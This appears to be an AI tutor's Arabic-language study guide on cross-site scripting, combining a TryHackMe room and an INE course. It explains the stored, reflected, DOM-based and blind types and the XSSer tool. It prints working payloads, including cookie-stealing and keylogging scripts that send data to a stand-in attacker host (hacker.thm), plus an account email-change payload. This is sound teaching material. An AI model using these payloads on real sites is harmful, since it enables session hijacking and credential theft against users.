خليني أقرأ الملف الجديد الأول.تمام، قرأت الملفين كلهم. دلوقتي هجمع كل حاجة من المصدرين في شرح واحد متكامل يبقى مرجعك.

---

# ثغرة الـ XSS — Cross-Site Scripting

## الشرح الجامع من مصدرين — TryHackMe Room + INE Course

---

## أولاً: الفكرة العامة

الشرح ده بيجمع محتوى الـ TryHackMe Room اللي حليناها مع بعض، ومحتوى ملف الدكتور INE، في مرجع واحد شامل — بيشرح الـ XSS من الصفر: إيه هي، ليه بتحصل، أنواعها الأربعة، أهداف الـ Payload، وأداة الـ Automation.

---

## ثانياً: اللي المفروض تاخده من الشرح ده

- تفهم إيه الـ XSS وليه بتحصل
- تعرف أنواعها الأربعة وتفرّق بينهم
- تعرف تقرأ أي Payload وتفهم هو بيعمل إيه
- تعرف فين تختبر وإزاي تفكر
- تعرف أداة الـ Automation الأساسية

---

## ثالثاً: الشرح الكامل بالعربي

---

### 📌 الجزء الأول: إيه هي الـ XSS ولماذا بتحصل؟

الـ **XSS — Cross-Site Scripting** (كروس سايت سكريبتنج) هي ثغرة في جانب العميل — يعني **Client-Side Vulnerability** (كلاينت سايد فالنيرابيليتي). معناها إن المشكلة مش في السيرفر وبس — المشكلة في إن الكود الضار بيتشغّل في **متصفح الضحية** نفسه.

**الفكرة الجوهرية:** موقع ويب بياخد **Input** (إنبوت) من المستخدم — يعني أي حاجة تكتبها: كلمة بحث، تعليق، اسمك في فورم — وبيعرضه على الصفحة.

لو الموقع ده **مش بيفحص** اللي بتكتبه ولا بينظّفه، أنت كمهاجم ممكن متكتبش نص عادي — تكتب **كود JavaScript** كامل. المتصفح لما يشوف `<script>` مش هيقرأه كنص — هيشغّله فعلاً كأوامر.

**ده بالضبط هو الـ XSS.**

> **ليه بتحصل الثغرة دي؟** السبب الجذري هو غياب الـ **Input Sanitization** (إنبوت سانيتايزيشن) والـ **Input Validation** (إنبوت فاليديشن) — يعني الموقع مش بينظّف ولا بيتحقق من المدخلات قبل ما يعرضها.

**الـ XSS بتأثر على:**

- أي موقع بياخد input من المستخدم ويعرضه
- المواقع اللي بتستخدم **Client-Side Scripting Languages** زي: JavaScript وFlash وCSS

---

### 📌 الجزء الثاني: الـ JavaScript — ليه مهم تعرفه؟

الـ **JavaScript** (جافاسكريبت) هي لغة برمجة من جانب العميل — **Client-Side Scripting Language**. المتصفح هو اللي بيشغّلها مباشرة.

**ليه الـ XSS مرتبطة بـ JavaScript تحديداً؟** لأن المتصفح بياخد أي `<script>` في الصفحة ويشغّله تلقائياً — ومش مهم جاء الكود ده من السيرفر الأصلي أو من مهاجم حقنه.

**حاجات مهمة في الـ JavaScript للـ XSS:**

|الدالة أو الخاصية|هي إيه؟|
|---|---|
|`<script>`|وسم بيقول للمتصفح "الجاي ده كود JS شغّله"|
|`alert()`|بتفتح popup — أبسط طريقة لإثبات الثغرة|
|`document.cookie`|بيجيب الكوكيز من المتصفح|
|`fetch()`|بيبعت HTTP request لأي URL|
|`btoa()`|بيحوّل نص لـ Base64|
|`document.onkeypress`|event بيتفعّل كل ضغطة كيبورد|
|`innerHTML`|بيكتب HTML مباشرة في الصفحة|
|`eval()`|بتشغّل نص كأوامر — خطيرة جداً|
|`window.location`|بيجيب بيانات الـ URL الحالي|
|`onerror`|event بيتشغّل لما حاجة تتعطل|

> **ملاحظة:** الـ JavaScript بتشتغل في **Browser Sandbox** (براوزر ساندبوكس) — بيئة معزولة داخل المتصفح بصلاحيات محدودة. لكن الـ XSS بيتجاوز الـ sandbox ده لأن الكود بيجي من "الموقع نفسه" من منظور المتصفح.

> **الـ JavaScript حساسة لحالة الحروف (Case Sensitive)** — يعني `Alert()` مختلفة عن `alert()`.

> **الـ JavaScript بتتشغّل بالترتيب** — المتصفح بيشغّل الكود من فوق لتحت حسب مكانه في الصفحة.

---

### 📌 الجزء الثالث: الـ Payload — جوهر الهجمة

الـ **Payload** (بايلود) في الـ XSS هو الـ JavaScript اللي المهاجم بيحقنه. وهو دايماً عبارة عن **جزأين**:

**١. الـ Intention (إنتنشن) = الهدف** إنت عايز الكود يعمل إيه؟

**٢. الـ Modification (موديفيكيشن) = التعديل** كل موقع مختلف — فلازم تعدّل شكل الـ Payload عشان يتناسب مع مكان الحقن.

---

#### أهداف الـ Payload:

---

**① Proof of Concept (بروف أوف كونسبت) — إثبات الثغرة**

أبسط payload — بيثبت إن الموقع عنده XSS من غير ما تعمل ضرر. بتخلي **Alert Box** (ألرت بوكس) تطلع.

```html
<script>alert('XSS');</script>
```

المتصفح لما يشوف `<script>` بيقول "ده كود لازم أشغله" — فبيفتح popup. الموقع نفّذ حاجة إنت عملتها — ده إثبات الثغرة.

---

**② Cookie Stealing / Session Hijacking (كوكي ستيلنج / سيشن هايجاكنج) — سرقة الجلسة**

الـ **Session** (سيشن) هي "جلستك" مع الموقع لما بتكون logged in. الموقع بيحتفظ بيها في **Cookie** (كوكي) — ملف صغير في متصفحك.

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**خطوة خطوة:**

- `document.cookie` ← بياخد قيمة الكوكيز
- `btoa(...)` ← بيحوّلها لـ **Base64** عشان تتبعت في الـ URL بدون مشاكل
- `fetch(...)` ← بيبعت HTTP request لسيرفر المهاجم

لما المهاجم يستلم الكوكيز دي، يحطها في متصفحه ويبقى logged in كإنه الضحية — من غير ما يعرف الـ password.

---

**③ Keylogging (كي لوغنج) — تسجيل الكيبورد**

```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>
```

كل ضغطة بتتبعت للمهاجم فوراً. لو الموقع فيه login page أو credit card form — المهاجم بياخد كل حاجة.

---

**④ Phishing (فيشنج) — صفحات تسجيل دخول مزيفة**

ده مذكور في ملف الدكتور INE. المهاجم بيحقن **Fake Login Form** (فيك لوجن فورم) في الصفحة — الضحية بتفتح الموقع الحقيقي وبتشوف فورم تسجيل دخول تبدو أصلية — لما تكتب فيها بياناتها بتروح للمهاجم.

---

**⑤ Browser Exploitation (براوزر إكسبلويتيشن) — استغلال ثغرات المتصفح**

الـ XSS ممكن تتستخدم كبوابة لاستغلال ثغرات في المتصفح نفسه.

---

**⑥ Business Logic (بيزنس لوجيك) — تنفيذ عملية معينة**

```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```

بيستغل functions موجودة في الموقع — بيغير إيميل الضحية لإيميل المهاجم، وبعدين يعمل "Forgot Password".

---

### 📌 الجزء الرابع: أنواع الـ XSS

الـ XSS اتنين تصنيفات رئيسية حسب ملف الدكتور: **Stored** و**Reflected**. لكن عملياً في الـ TryHackMe وفي الـ penetration testing بنتعامل مع **أربعة أنواع**.

---

### النوع الأول: Stored XSS (ستورد XSS) — الـ XSS المخزّن / المستمر

**اسم تاني:** Persistent XSS (برسيستنت XSS)

#### الفكرة:

الـ Payload بيتخزن فعلياً في **Database** (داتابيز) بتاعة الموقع أو في الـ Source Code نفسه. يعني كل user بيفتح الصفحة دي — الكود بيتشغّل في متصفحه تلقائي.

#### مثال عملي:

موقع فيه تعليقات (Comments). المهاجم بدل ما يكتب تعليق عادي، كتب:

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

الموقع مش بيفحص التعليق — فخزّنه في الداتابيز. دلوقتي **أي حد** يفتح الصفحة دي، المتصفح بتاعه بيشوف الـ `<script>` ويشغّله — وكوكيه بيتبعت للمهاجم.

#### إزاي يحصل ده؟

```
المهاجم ← يكتب Payload في input (تعليق/فورم/بروفايل)
    ↓
الموقع ← بيخزّن الـ Payload في الداتابيز
    ↓
أي ضحية تفتح الصفحة ← المتصفح بيشغّل الـ Payload
    ↓
الـ Payload ← بيبعت بيانات الضحية للمهاجم
```

#### فين تختبر الـ Stored XSS؟

- خانات التعليقات
- بيانات الـ Profile
- أي حاجة بتتكتب وبتتعرض لناس تانيين
- Website Listings

> **نقطة ذهبية من الـ TryHackMe:** أحياناً المطور بيحمي الـ Client-Side بس — مثلاً dropdown بيسمح بعمر من 1 لـ 100 بس. لو بعتّ الـ request يدوياً من Burp Suite بقيمة `<script>...` — الـ Server-Side مش حامي وهيخزن الكود.

---

### النوع الثاني: Reflected XSS (ريفليكتد XSS) — الـ XSS المنعكس

**اسم تاني:** Non-Persistent XSS (نون برسيستنت XSS) — وده **أكثر أنواع الـ XSS شيوعاً**.

#### الفكرة:

الـ Payload بيتبعت في الـ **HTTP Request** مباشرة — مثلاً في الـ URL. السيرفر بيرجّعه (ينعكسه) في الـ Response فوراً من غير ما يتخزن.

#### مثال عملي:

موقع فيه صفحة بتاخد الـ error من الـ URL وتعرضه:

```
https://website.thm/page.php?error=اسمك غلط
```

لو المهاجم كتب:

```
https://website.com/page.php?<script>alert('XSS')</script>
```

الموقع هيرجّع الكود ده في الـ HTML والمتصفح هيشغّله.

#### إزاي يحصل ده؟

```
المهاجم ← يصنع Link فيه Payload في الـ URL
    ↓
المهاجم ← يبعت الـ Link للضحية (إيميل/رسالة/iframe)
    ↓
الضحية تضغط الـ Link ← المتصفح يبعت Request للموقع
    ↓
الموقع ← يرجّع الـ Payload في الـ Response
    ↓
متصفح الضحية ← يشغّل الـ Payload
```

**المهاجم مش بيفتح الـ URL ده هو** — لو فتحه هو، هيتشغّل عليه هو بس. الضحية هي اللي لازم تفتحه.

#### فين تختبر الـ Reflected XSS؟

- الـ **Query String** في الـ URL (زي `?search=...`)
- الـ **URL File Path**
- أحياناً الـ **HTTP Headers**

---

### النوع الثالث: DOM-Based XSS (DOM بيسد XSS)

**اسم تاني:** Type-0 XSS

#### أولاً: إيه هو الـ DOM؟

الـ **DOM = Document Object Model** (دوكيومنت أوبجيكت موديل) — هو طريقة المتصفح في "فهم" صفحة الـ HTML.

لما المتصفح يحمّل صفحة، بيحوّلها لـ **شجرة هرمية** (Hierarchical Tree — هايراركيكال تري) من العناصر. كل `<div>` وكل `<p>` وكل `<img>` بقى له مكانه في الشجرة دي.

الـ JavaScript قادر يوصل لأي عنصر في الشجرة ده ويعدّل فيه — يضيف، يحذف، يغيّر محتوى، يغيّر ستايل، يستجيب لـ events.

**ليه الـ DOM مهم للـ XSS؟** لأن المطور أحياناً بيكتب JavaScript بياخد Input من الـ URL ويكتبه مباشرة في الـ DOM من غير ما يفحصه — وده بيخلق ثغرة.

#### فكرة الـ DOM-Based XSS:

هنا الـ Payload **مش بيروح للسيرفر خالص** — الموضوع كله في المتصفح. الصفحة فيها JavaScript بيقرأ جزء من الـ URL (زي الـ `#hash`) وبيكتبه على الصفحة مباشرة.

#### مثال عملي:

```javascript
document.getElementById("output").innerHTML = window.location.hash;
```

لو المهاجم بعت رابط:

```
https://website.thm/page#<img src=x onerror=alert('XSS')>
```

المتصفح هياخد `<img src=x onerror=alert('XSS')>` ويكتبه في الصفحة — الصورة هتفشل وحدث الـ `onerror` هيشغّل الـ `alert`.

#### الفرق الجوهري عن النوعين الأوليين:

في Reflected وStored — الـ Payload بيعدّي على السيرفر. في الـ DOM-Based — **الكود بيتشغّل في المتصفح بالكامل والسيرفر مشوفوش**.

#### إزاي تكتشفه؟

بتفتش في الـ JavaScript Source Code عن:

- `window.location.x` — أي قيمة جاية من الـ URL
- `eval()` — خطيرة جداً، بتشغّل نص كأوامر
- `innerHTML` — بيكتب HTML مباشرة

لو حد بياخد قيمة من المستخدم ويحطها في `eval()` أو `innerHTML` من غير فلترة — دي ثغرة DOM-Based XSS.

---

### النوع الرابع: Blind XSS (بلايند XSS) — الـ XSS الأعمى

#### الفكرة:

هو نفس الـ Stored XSS — الـ Payload بيتخزن. الفرق إن **مش هتشوف الـ Payload بيتشغّل** — لأنه بيتشغّل في مكان مش عندك وصول إليه زي **Admin Panel** (أدمن بانيل) أو لوحة الموظفين.

#### مثال عملي:

موقع فيه Contact Form — إنت بتبعت رسالة. الرسالة بتتحوّل لـ Support Ticket بيشوفه موظف على portal داخلي.

إنت بتكتب في الرسالة:

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

لما الموظف يفتح الـ Ticket — الكود بيتشغّل في متصفحه هو، وبيبعت كوكيه للمهاجم. المهاجم دلوقتي عنده session بتاعة الأدمن.

#### ليه "أعمى"؟

في الـ Stored العادي — إنت تقدر تشوف الـ Payload بيتشغّل عليك لما تفتح الصفحة. في الـ Blind — مش شايف حاجة. عشان كده محتاج الـ Payload يبعتلك إشارة لما يتشغّل.

#### الأداة المتخصصة:

**XSS Hunter Express** (XSS هنتر إكسبريس) — بتنصّبها على سيرفرك، بتستخدم الـ URL بتاعها في الـ Payload. لما الـ Payload يتشغّل، الأداة بتبعتلك:

- الكوكيز
- الـ URL بتاع الصفحة (يعني عنوان الـ portal الداخلي)
- محتوى الصفحة كاملاً

---

### 📌 الجزء الخامس: مقارنة الأنواع الأربعة

||Stored|Reflected|DOM-Based|Blind|
|---|---|---|---|---|
|**الـ Payload بيتخزن؟**|✅ في الداتابيز|❌|❌|✅ في الداتابيز|
|**السيرفر بيشوفه؟**|✅|✅|❌|✅|
|**مين اللي يتأثر؟**|كل زوار الصفحة|اللي يفتح الـ Link|اللي يفتح الـ Link|الأدمن / الموظف|
|**هتشوف الـ Payload بيتشغّل؟**|✅|✅|✅|❌|
|**الخطورة**|عالية|متوسطة|متوسطة|عالية جداً|

---

### 📌 الجزء السادس: أداة الـ Automation — XSSer


**XSSer** (XSS-ر) — اختصار لـ **Cross-Site Scripter** — هي framework (فريمووورك) أوتوماتيك لكشف واستغلال ثغرات الـ XSS.

**مميزاتها:**

- فيها أكتر من **1300 XSS Attack Vector** جاهزة
- بتقدر تتجاوز بعض الـ **Filters** (فيلترز) والـ **WAF** (ويب أبليكيشن فايروول)
- بتجرّب الـ Payloads تلقائياً وبتقولك أيها نجح

**GitHub:** https://github.com/epsylon/xsser

---

## رابعاً: نطق المصطلحات الصعبة

|المصطلح|النطق بالعربي|
|---|---|
|Cross-Site Scripting|كروس سايت سكريبتنج|
|Client-Side Vulnerability|كلاينت سايد فالنيرابيليتي|
|Input Sanitization|إنبوت سانيتايزيشن|
|Input Validation|إنبوت فاليديشن|
|Payload|بايلود|
|Intention / Modification|إنتنشن / موديفيكيشن|
|Proof of Concept|بروف أوف كونسبت|
|Session Hijacking|سيشن هايجاكنج|
|Document Object Model|دوكيومنت أوبجيكت موديل|
|Hierarchical Tree|هايراركيكال تري|
|Persistent / Non-Persistent|برسيستنت / نون برسيستنت|
|XSS Hunter Express|XSS هنتر إكسبريس|
|Browser Sandbox|براوزر ساندبوكس|
|XSSer|XSS-ر|
|Web Application Firewall (WAF)|ويب أبليكيشن فايروول|
|Attack Vector|أتاك فيكتور|
|Admin Panel|أدمن بانيل|

---

## خامساً: قاموس المصطلحات

|المصطلح|المعنى|
|---|---|
|XSS — Cross-Site Scripting|ثغرة حقن JavaScript تتشغّل في متصفح ضحية|
|Client-Side Vulnerability|ثغرة في جانب العميل — بتتشغّل في المتصفح|
|Input Sanitization|تنظيف المدخلات من الأكواد الضارة|
|Input Validation|التحقق من صحة وشكل المدخلات|
|Payload|الكود الضار اللي المهاجم بيحقنه|
|Intention|الهدف من الـ Payload|
|Modification|تعديل الـ Payload عشان يتناسب مع مكان الحقن|
|Session|الجلسة بين المستخدم والموقع|
|Cookie|ملف صغير في المتصفح بيحتفظ ببيانات الجلسة|
|Session Hijacking|سرقة جلسة مستخدم والدخول بحسابه|
|Keylogging|تسجيل ضغطات الكيبورد|
|Phishing|صفحات تسجيل دخول مزيفة لسرقة بيانات|
|Browser Exploitation|استغلال ثغرات في المتصفح نفسه|
|Business Logic|استغلال functions موجودة في الموقع|
|Stored XSS|XSS بيتخزن في الداتابيز — بيأثر على كل الزوار|
|Reflected XSS|XSS بيجي في الـ URL وينعكس في الـ Response|
|DOM-Based XSS|XSS بيحصل في المتصفح بالكامل بدون السيرفر|
|Blind XSS|XSS بيتشغّل في مكان مش شايفه|
|DOM|هيكل صفحة HTML كما يفهمها المتصفح|
|eval()|دالة بتشغّل نص كأوامر — خطيرة جداً|
|innerHTML|خاصية بتكتب HTML مباشرة في الصفحة|
|window.location|الكائن اللي فيه بيانات الـ URL الحالي|
|Base64|طريقة تشفير بسيطة لتحويل البيانات لنص قابل للنقل|
|XSS Hunter Express|أداة لكشف الـ Blind XSS|
|XSSer|Framework أوتوماتيك لكشف واستغلال الـ XSS|
|WAF|Web Application Firewall — جدار حماية الموقع|
|Attack Vector|مسار أو طريقة الهجوم|
|Browser Sandbox|بيئة معزولة داخل المتصفح بصلاحيات محدودة|
|Query String|الجزء بعد `?` في الـ URL|
|Admin Panel|لوحة تحكم المسؤول|

---

## سادساً: الملخص النهائي

**الـ XSS** ثغرة حقن — المهاجم بيكتب JavaScript بدل النص العادي في أي input مكشوف في موقع. لو الموقع مش بيفحص المدخلات، المتصفح بيشغّل الكود ده على الضحية.

**الـ Payload** دايماً جزأين: الهدف (إيه اللي عايز تعمله) والتعديل (إزاي تخلّيه يشتغل في الموقع ده تحديداً). الأهداف الممكنة: إثبات ثغرة، سرقة session، تسجيل كيبورد، phishing، استغلال المتصفح، أو تنفيذ عملية محددة.

**الأنواع الأربعة:**

- **Stored** — بيتخزن في الداتابيز، بيأثر على كل الزوار، الأكثر استمراراً
- **Reflected** — بيجي في الـ URL، الأكثر شيوعاً، الضحية لازم تضغط رابط
- **DOM-Based** — بيحصل في المتصفح خالص، السيرفر مشوفوش
- **Blind** — زي الـ Stored بس بيتشغّل في مكان مش شايفه زي لوحة الأدمن

**اللي المفروض تعرفه في JavaScript للـ XSS:** `alert()`, `document.cookie`, `fetch()`, `btoa()`, `innerHTML`, `eval()`, `window.location`, `document.onkeypress`, `onerror`.

**للكشف الأوتوماتيك:** أداة **XSSer** بيها 1300+ Payload جاهز وبتتجاوز الـ Filters والـ WAF.

---

ده مرجعك الكامل. لما تجهز للـ Tasks العملية (6-7-8) في الـ Room قولي وهنبدأ بيهم. 💪